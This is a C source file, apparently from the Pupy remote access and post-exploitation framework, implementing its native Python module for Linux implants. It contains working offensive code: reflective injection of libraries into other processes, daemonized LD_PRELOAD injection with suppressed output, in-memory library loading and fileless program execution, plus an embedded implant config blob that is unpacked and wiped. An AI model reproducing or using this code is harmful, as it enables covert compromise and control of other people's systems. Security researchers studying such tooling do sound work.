/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include "debug.h"
#include "Python-dynload.h"
#include "daemonize.h"
#include <arpa/inet.h>
#include "tmplibrary.h"
#include <sys/mman.h>
#ifdef Linux
#include <sys/prctl.h>
#include "memfd.h"
#include "injector.h"
#endif

#include "library.c"

#include "revision.h"

static const char module_doc[] = DOC("Builtins utilities for pupy");

static char pupy_config[65536] = "####---PUPY_CONFIG_COMES_HERE---####\n";

static PyObject *ExecError;

#include "lzmaunpack.c"

#ifdef _PUPY_SO
#include "jni_on_load.c"
#endif

static PyObject *Py_get_modules(PyObject *self, PyObject *args)
{
    static PyObject *modules = NULL;
    if (!modules) {
        modules = PyDict_lzmaunpack(
            library_c_start,
            library_c_size
        );
        Py_XINCREF(modules);

        munmap((char *) library_c_start,
            library_c_size);
    }

    Py_XINCREF(modules);
    return modules;
}

static PyObject *
Py_get_pupy_config(PyObject *self, PyObject *args)
{
    static PyObject *config = NULL;
    if (!config) {
        unsigned int pupy_lzma_length = 0x0;
        memcpy(&pupy_lzma_length, pupy_config, sizeof(unsigned int));

        ssize_t compressed_size = ntohl(pupy_lzma_length);

        config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
        memset(pupy_config, 0xFF, compressed_size);

        Py_XINCREF(config);
    }

    Py_XINCREF(config);
    return config;
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
#ifdef __x86_64__
    return Py_BuildValue("s", "x64");
#elif __i386__
    return Py_BuildValue("s", "x86");
#else
    return Py_BuildValue("s", "unknown");
#endif
}

static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
{
    const char *lpCmdBuffer;
    const char *lpDllBuffer;
    uint32_t dwDllLenght;
    PyObject* py_HookExit;

    if (!PyArg_ParseTuple(args, "zs#O", &lpCmdBuffer, &lpDllBuffer, &dwDllLenght, &py_HookExit))
        return NULL;

    char ldobject[PATH_MAX] = {};
    int cleanup_workaround = 0;
    int cleanup = 1;

    int fd = drop_library(ldobject, PATH_MAX, lpDllBuffer, dwDllLenght);
    if (fd < 0) {
        dprint("Couldn't drop library: %m\n");
        return NULL;
    }

#ifdef Linux
    if (is_memfd_path(ldobject)) {
        cleanup_workaround = 1;
        cleanup = 0;
    }
#endif

    char cmdline[PATH_MAX*2] = {};
    snprintf(
        cmdline, sizeof(cmdline), "LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null",
        ldobject,
        PyObject_IsTrue(py_HookExit),
        cleanup,
        lpCmdBuffer
    );

    dprint("Program to execute in child context: %s\n", cmdline);

#if defined(Linux) && !defined(DEBUG)
    if (cleanup_workaround)
        prctl(4, 1, 0, 0, 0);
#endif

    pid_t pid = daemonize(0, NULL, NULL, false);
    if (pid == 0) {
        /* Daemonized context */
        dprint("Daemonization complete - client\n");
        execl("/bin/sh", "/bin/sh", "-c", cmdline, NULL);
        unlink(ldobject);
        exit(255);
    }

    dprint("Daemonization complete - server\n");
    if (cleanup_workaround) {
        sleep(2);
        close(fd);
    }

#if defined(Linux) && !defined(DEBUG)
    if (cleanup_workaround)
        prctl(4, 0, 0, 0, 0);
#endif

    if (pid == -1) {
        dprint("Couldn\'t daemonize: %m\n");
        unlink(ldobject);
        return PyInt_FromLong(-1);
    }

    return PyInt_FromLong(pid);
}

#ifdef Linux
static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
    uint32_t dwPid;
    const char *lpDllBuffer;
    uint32_t dwDllLenght;
    int ret = 0;
    if (!PyArg_ParseTuple(args, "Is#", &dwPid, &lpDllBuffer, &dwDllLenght))
        return NULL;

    dprint("Injection requested. PID: %d\n", dwPid);

    char buf[PATH_MAX]={};
    int fd = drop_library(buf, PATH_MAX, lpDllBuffer, dwDllLenght);
    if (!fd) {
        PyErr_SetString(ExecError, "Couldn't drop library");
        return NULL;
    }

    int is_memfd = is_memfd_path(buf);

    dprint("Injecting %s to %d\n", buf, dwPid);

    injector_t *injector;

    if (injector_attach(&injector, dwPid) != 0) {
        PyErr_SetString(ExecError, "Injector attach failed");
        return NULL;
    }

#ifndef DEBUG
    if (is_memfd)
        prctl(4, 1, 0, 0, 0);
#endif

    if (injector_inject(injector, buf) == 0) {
        dprint("\"%s\" successfully injected\n", buf);
        ret = 1;
    }

    if (is_memfd) {
#ifndef DEBUG
        prctl(4, 0, 0, 0, 0);
#endif
        close(fd);
    } else {
        unlink(buf);
    }

    injector_detach(&injector);

    if (ret != 1) {
        PyErr_SetString(ExecError, injector_error());
        return NULL;
    }

    return PyBool_FromLong(0);
}


#endif

static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
    const char *lpDllBuffer;
    uint32_t dwDllLenght;
    const char *dllname;
    if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
        return NULL;

    printf("Py_load_dll(%s)\n", dllname);

    return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
}

static PyObject *Py_mexec(PyObject *self, PyObject *args)
{
    const char *buffer = NULL;
    size_t buffer_size = 0;
    PyObject *argv_obj = NULL;
    PyObject *redirected_obj = NULL;
    PyObject *detach_obj = NULL;

    if (!PyArg_ParseTuple(args, "s#OOO", &buffer, &buffer_size, &argv_obj, &redirected_obj, &detach_obj))
        return NULL;

    Py_ssize_t argc = PySequence_Length(argv_obj);
    if (argc < 1) {
        PyErr_SetString(ExecError, "Args not passed");
        return NULL;
    }

    bool redirected = PyObject_IsTrue(redirected_obj);
    bool detach =  PyObject_IsTrue(detach_obj);
    char **argv = (char **) malloc(sizeof(char*) * (argc + 1));
    if (!argv) {
        PyErr_SetString(ExecError, "Too many args");
        return NULL;
    }

    int i;
    for (i=0; i<argc; i++) {
        PyObject *arg = NULL;
        arg = PySequence_GetItem(argv_obj, i);
        if (arg)
            argv[i] = PyString_AsString(arg);
    }
    argv[argc] = NULL;

    int stdior[3] = { -1, -1, -1 };
    pid_t pid = memexec(buffer, buffer_size, (const char **) argv, stdior, redirected, detach);

    if (pid < 0) {
        PyErr_SetString(ExecError, "Can't execute");
        return NULL;
    }

    PyObject * p_stdin = Py_None;
    PyObject * p_stdout = Py_None;
    PyObject * p_stderr = Py_None;

    if (redirected) {
        p_stdin = PyFile_FromFile(fdopen(stdior[0], "w"), "mexec:stdin", "a", fclose);
        p_stdout = PyFile_FromFile(fdopen(stdior[1], "r"), "mexec:stdout", "r", fclose);
        p_stderr = PyFile_FromFile(fdopen(stdior[2], "r"), "mexec:stderr", "r", fclose);

        PyFile_SetBufSize(p_stdin, 0);
        PyFile_SetBufSize(p_stdout, 0);
        PyFile_SetBufSize(p_stderr, 0);
    }

    return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
}

static PyMethodDef methods[] = {
    { "get_pupy_config", Py_get_pupy_config, METH_NOARGS, DOC("get_pupy_config() -> string") },
    { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
    { "get_modules", Py_get_modules, METH_NOARGS, DOC("get pupy library") },
#ifdef Linux
    { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
      DOC("reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure")
    },
#endif
    { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
    { "mexec", Py_mexec, METH_VARARGS, DOC("mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))") },
    { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, DOC("ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid") },
    { NULL, NULL },     /* Sentinel */
};

DL_EXPORT(void)
initpupy(void) {

    PyObject *pupy = Py_InitModule3("pupy", methods, (char *) module_doc);
    if (!pupy) {
        return;
    }

    PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
    ExecError = PyErr_NewException("pupy.error", NULL, NULL);
    Py_INCREF(ExecError);
    PyModule_AddObject(pupy, "error", ExecError);

#ifdef _PUPY_SO
    setup_jvm_class();
#endif
}
